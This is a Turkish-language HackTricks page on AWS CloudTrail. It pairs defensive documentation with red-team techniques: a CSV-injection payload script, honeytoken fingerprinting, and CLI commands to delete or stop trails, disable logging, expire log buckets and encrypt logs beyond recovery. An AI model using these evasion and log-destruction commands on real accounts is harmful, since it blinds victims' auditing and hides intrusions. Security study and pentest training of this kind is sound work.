# AWS - CloudTrail Enum

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **AWS ortamınızdaki etkinlikleri kaydeder ve izler**. AWS kaynaklarıyla yapılan tüm etkileşimler için kimin ne yaptığını, ne zaman ve nereden olduğunu içeren ayrıntılı **olay günlüklerini** yakalar. Bu, değişikliklerin ve eylemlerin bir denetim izini sağlar, güvenlik analizi, uyum denetimi ve kaynak değişiklik takibi konusunda yardımcı olur. CloudTrail, kullanıcı ve kaynak davranışını anlamak, güvenlik duruşunu artırmak ve düzenleyici uyumu sağlamak için gereklidir.

Her kaydedilen olay şunları içerir:

* Çağrılan API'nin adı: `eventName`
* Çağrılan hizmet: `eventSource`
* Zaman: `eventTime`
* IP adresi: `SourceIPAddress`
* Ajan yöntemi: `userAgent`. Örnekler:
* Signing.amazonaws.com - AWS Yönetim Konsolu'ndan
* console.amazonaws.com - Hesabın kök kullanıcısı
* lambda.amazonaws.com - AWS Lambda
* İstek parametreleri: `requestParameters`
* Yanıt öğeleri: `responseElements`

Olaylar, **yaklaşık her 5 dakikada bir JSON dosyasında** yeni bir günlük dosyasına yazılır, CloudTrail tarafından tutulur ve nihayetinde günlük dosyaları **yaklaşık 15 dakika sonra S3'e teslim edilir**.\
CloudTrail günlükleri **hesaplar ve bölgeler arasında birleştirilebilir.**\
CloudTrail, **günlük dosyası bütünlüğünü kullanarak, günlük dosyalarınızın CloudTrail tarafından size teslim edildiğinden beri değişmediğini doğrulamanıza olanak tanır.** Bir özet dosyası içinde günlüklerin SHA-256 hash'ini oluşturur. Yeni günlüklerin sha-256 hash'i her saat başı oluşturulur.\
Bir Trail oluştururken olay seçicileri, kaydedilecek trail'i belirtmenize olanak tanır: Yönetim, veri veya içgörü olayları.

Günlükler bir S3 kovasında saklanır. Varsayılan olarak Sunucu Tarafı Şifreleme (SSE-S3) kullanılır, böylece AWS, buna erişimi olan kişiler için içeriği şifre çözer, ancak ek güvenlik için KMS ile SSE ve kendi anahtarlarınızı kullanabilirsiniz.

Günlükler, **bu ad formatına sahip bir S3 kovasında saklanır**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Örnek: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Her klasör içinde her günlük, **bu formatı takip eden bir isme sahip olacaktır**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Günlük Dosyası İsimlendirme Konvansiyonu

![](<../../../../.gitbook/assets/image (122).png>)

Ayrıca, **dosya bütünlüğünü kontrol etmek için** **özet dosyaları** **aynı kovada** bulunacaktır:

![](<../../../../.gitbook/assets/image (195).png>)

### Birden Fazla Hesaptan Günlükleri Birleştirme

* Günlük dosyalarının teslim edileceği AWS hesabında bir Trail oluşturun
* CloudTrail için çapraz hesap erişimine izin veren hedef S3 kovasına izinler uygulayın ve erişime ihtiyaç duyan her AWS hesabına izin verin
* Diğer AWS hesaplarında yeni bir Trail oluşturun ve 1. adımda oluşturulan kovayı kullanmayı seçin

Ancak, tüm günlükleri aynı S3 kovasında saklayabilseniz de, birden fazla hesaptan CloudTrail günlüklerini tek bir AWS hesabına ait CloudWatch Logs'a birleştiremezsiniz.

{% hint style="danger" %}
Bir hesabın, **farklı Trails** ile CloudTrail **etkin** olabileceğini ve aynı (veya farklı) günlükleri farklı kovalarda saklayabileceğini unutmayın.
{% endhint %}

### Tüm organizasyon hesaplarından 1'e CloudTrail

Bir CloudTrail oluştururken, organizasyondaki tüm hesaplar için cloudtrail'i etkinleştirmek ve günlükleri sadece 1 kovaya almak için belirtmek mümkündür:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Bu şekilde, tüm hesapların tüm bölgelerinde CloudTrail'i kolayca yapılandırabilir ve günlükleri 1 hesapta (korumanız gereken) merkezileştirebilirsiniz.

### Günlük Dosyalarını Kontrol Etme

Günlüklerin değiştirilmediğini kontrol etmek için şunu çalıştırabilirsiniz:

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### CloudWatch'a Günlükler

**CloudTrail, şüpheli aktiviteler gerçekleştirildiğinde sizi uyaran uyarılar ayarlayabilmeniz için günlükleri otomatik olarak CloudWatch'a gönderebilir.**\
CloudTrail'in günlükleri CloudWatch'a göndermesine izin vermek için bir **rol** oluşturulması gerektiğini unutmayın. Mümkünse, bu işlemleri gerçekleştirmek için AWS varsayılan rolünün kullanılması önerilir. Bu rol, CloudTrail'in:

* CreateLogStream: CloudWatch Logs günlük akışları oluşturmasına izin verir
* PutLogEvents: CloudTrail günlüklerini CloudWatch Logs günlük akışına iletmesine izin verir

### Olay Geçmişi

CloudTrail Olay Geçmişi, kaydedilen günlükleri bir tabloda incelemenizi sağlar:

![](<../../../../.gitbook/assets/image (89).png>)

### İçgörüler

**CloudTrail İçgörüleri**, CloudTrail izlerinden yazma yönetim olaylarını otomatik olarak **analiz eder** ve **olağandışı aktiviteler** hakkında sizi **uyarır**. Örneğin, belirlenen temel değerlerden farklı olarak `TerminateInstance` olaylarında bir artış varsa, bunu bir İçgörü olayı olarak göreceksiniz. Bu olaylar, **olağandışı API aktivitelerini bulmayı ve yanıt vermeyi her zamankinden daha kolay hale getirir**.

İçgörüler, CloudTrail günlükleriyle aynı kovada saklanır: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Güvenlik

| CloudTrail Günlük Dosyası Bütünlüğü | <ul><li>Günlüklerin değiştirilip değiştirilmediğini (değiştirilmiş veya silinmiş) doğrulayın</li><li><p>Her dosya için hash oluşturmak için özet dosyaları kullanır</p><ul><li>SHA-256 hashing</li><li>SHA-256 ile dijital imzalama için RSA</li><li>Amazon'a ait özel anahtar</li></ul></li><li>Bir özet dosyası oluşturmak 1 saat sürer (her saat başında yapılır)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Yetkisiz erişimi durdurun           | <ul><li><p>IAM politikaları ve S3 kova politikaları kullanın</p><ul><li>güvenlik ekibi —> yönetici erişimi</li><li>denetçiler —> yalnızca okuma erişimi</li></ul></li><li>Günlükleri şifrelemek için SSE-S3/SSE-KMS kullanın</li></ul>                                                                                                                                        |
| Günlük dosyalarının silinmesini önleyin | <ul><li>IAM ve kova politikaları ile silme erişimini kısıtlayın</li><li>S3 MFA silme yapılandırması yapın</li><li>Günlük Dosyası Doğrulaması ile doğrulayın</li></ul>                                                                                                                                                                                            |

## Erişim Danışmanı

AWS Erişim Danışmanı, içgörülerini toplamak için son 400 günün AWS **CloudTrail günlüklerine dayanır**. CloudTrail, bir AWS hesabında yapılan AWS API çağrılarının ve ilgili olayların tarihini kaydeder. Erişim Danışmanı, bu verileri kullanarak **hizmetlerin en son ne zaman erişildiğini gösterir**. CloudTrail günlüklerini analiz ederek, Erişim Danışmanı bir IAM kullanıcısının veya rolünün hangi AWS hizmetlerine eriştiğini ve bu erişimin ne zaman gerçekleştiğini belirleyebilir. Bu, AWS yöneticilerinin **izinleri iyileştirme** konusunda bilinçli kararlar almasına yardımcı olur; çünkü uzun süre erişilmeyen hizmetleri tanımlayabilir ve gerçek kullanım kalıplarına dayalı olarak aşırı geniş izinleri potansiyel olarak azaltabilir.

{% hint style="success" %}
Bu nedenle, Erişim Danışmanı, kullanıcılara verilen **gereksiz izinler hakkında bilgi verir** böylece yönetici bunları kaldırabilir
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Eylemler

### Enumerasyon
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

CloudTrail içinde, günlükler CSV formatında dışa aktarıldığında ve Excel ile açıldığında rastgele kodu çalıştıracak bir CVS enjeksiyonu gerçekleştirmek mümkündür.\
Aşağıdaki kod, yükü içeren kötü bir Trail adıyla günlük girişi oluşturacaktır:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Daha fazla bilgi için CSV Enjeksiyonları hakkında sayfayı kontrol edin:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Bu spesifik teknik hakkında daha fazla bilgi için [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/) adresini kontrol edin.

## **Algılama Atlatma**

### HoneyTokens **atlatma**

Honeytoken'lar **hassas bilgilerin sızdırılmasını tespit etmek için** oluşturulmuştur. AWS durumunda, bunlar **kullanımı izlenen AWS anahtarlarıdır**, eğer bu anahtarla bir eylem tetiklenirse, o zaman birisi bu anahtarı çalmış olmalıdır.

Ancak, [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) tarafından oluşturulan Honeytoken'lar ya tanınabilir hesap adı kullanıyor ya da tüm müşterileri için aynı AWS hesap kimliğini kullanıyor. Bu nedenle, eğer Cloudtrail herhangi bir günlük oluşturmadan hesap adını ve/veya hesap kimliğini alabilirseniz, **anahtarın bir honeytoken olup olmadığını bilebilirsiniz**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam__detect_honeytokens/main.py#L57) bazı kurallara sahiptir, bir anahtarın [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**'e ait olup olmadığını tespit etmek için:**

* Eğer **`canarytokens.org`** rol adında görünüyorsa veya hesap kimliği **`534261010715`** hata mesajında görünüyorsa.
* Daha yakın zamanda test ettiğimizde, **`717712589309`** hesabını kullanıyorlar ve hala adında **`canarytokens.com`** dizesi var.
* Eğer **`SpaceCrab`** hata mesajında rol adında görünüyorsa.
* **SpaceSiren**, kullanıcı adları oluşturmak için **uuids** kullanır: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Eğer **isim rastgele üretilmiş gibi görünüyorsa**, bunun bir HoneyToken olma olasılığı yüksektir.

#### Anahtar Kimliğinden Hesap Kimliğini Almak

**Erişim anahtarının** içinde **kodlanmış** olarak **Hesap Kimliğini** alabilirsiniz, [**burada açıklandığı gibi**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) ve hesap kimliğini Honeytoken AWS hesaplarınızın listesiyle kontrol edebilirsiniz:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Check more information in the [**orginal research**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Log oluşturma

Bunun için en etkili teknik aslında basit bir tekniktir. Bulduğunuz anahtarı kullanarak kendi saldırgan hesabınızdaki bir hizmete erişin. Bu, **CloudTrail'in KENDİ AWS hesabınızda bir log oluşturmasını sağlar ve kurbanın hesabında değil**.

Sorun şu ki, çıktı size hesap kimliği ve hesap adı belirten bir hata gösterecektir, böylece **Honeytoken olup olmadığını görebilirsiniz**.

#### Log göndermeyen AWS hizmetleri

Geçmişte bazı **AWS hizmetleri CloudTrail'e log göndermiyordu** (buradan [bir liste bulabilirsiniz](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Bu hizmetlerden bazıları, yetkisiz (honeytoken anahtarı) birinin erişmeye çalışması durumunda **anahtar rolünün ARN'sini** içeren bir **hata** ile **yanıt verecektir**.

Bu şekilde, bir **saldırgan herhangi bir log tetiklemeksizin anahtarın ARN'sini elde edebilir**. ARN'de saldırgan **AWS hesap kimliğini ve adını** görebilir, bu nedenle HoneyToken'ın şirket hesap kimliklerini ve adlarını bilmek kolaydır, bu şekilde bir saldırgan token'ın HoneyToken olup olmadığını belirleyebilir.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
CloudTrail logları oluşturmayan tüm kamu API'lerinin artık düzeltildiğini unutmayın, bu nedenle belki kendi çözümünüzü bulmanız gerekebilir...

Daha fazla bilgi için [**orijinal araştırmaya**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/) bakın.
{% endhint %}

### Üçüncü Altyapıya Erişim

Belirli AWS hizmetleri **veritabanları** veya **Kubernetes** kümeleri (EKS) gibi **bazı altyapılar oluşturacaktır**. Bir kullanıcı, bu hizmetlere (Kubernetes API'si gibi) **doğrudan konuştuğunda** **AWS API'sini kullanmayacaktır**, bu nedenle CloudTrail bu iletişimi göremeyecektir.

Bu nedenle, EKS'ye erişimi olan bir kullanıcı, EKS API'sinin URL'sini keşfettiyse, yerel olarak bir token oluşturabilir ve **Cloudtrail tarafından tespit edilmeden API hizmetiyle doğrudan konuşabilir**.

Daha fazla bilgi için:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail Yapılandırmasını Değiştirme

#### İzleri sil
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### İzleri Durdur
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Çok bölgeli günlüğü devre dışı bırak

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Olay Seçicileri ile Günlüğü Devre Dışı Bırakma

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

İlk örnekte, tek bir olay seçici, tek bir nesne ile JSON dizisi olarak sağlanmıştır. `"ReadWriteType": "ReadOnly"` ifadesi, **olay seçicinin yalnızca salt okunur olayları yakalaması gerektiğini** belirtir (bu nedenle CloudTrail içgörüleri **örneğin yazma** olaylarını kontrol etmeyecek).

Olay seçiciyi belirli gereksinimlerinize göre özelleştirebilirsiniz.

#### S3 yaşam döngüsü politikası ile günlük silme

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Bucket Konfigürasyonunu Değiştirme

* S3 bucket'ını sil
* CloudTrail hizmetinden gelen yazmaları reddetmek için bucket politikasını değiştir
* S3 bucket'ına nesneleri silmek için yaşam döngüsü politikası ekle
* CloudTrail günlüklerini şifrelemek için kullanılan kms anahtarını devre dışı bırak

### Cloudtrail ransomware

#### S3 ransomware

**Asimetrik bir anahtar** oluşturabilir ve **CloudTrail'in verileri** o anahtar ile şifrelemesini sağlayabilir ve **özel anahtarı** silerek CloudTrail içeriğinin kurtarılamayacağını garanti edebilirsin.\
Bu temelde **S3-KMS ransomware** olarak açıklanmıştır:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS ransomware**

Bu, önceki saldırıyı farklı izin gereksinimleri ile gerçekleştirmenin en kolay yoludur:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referanslar**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** bizi **takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
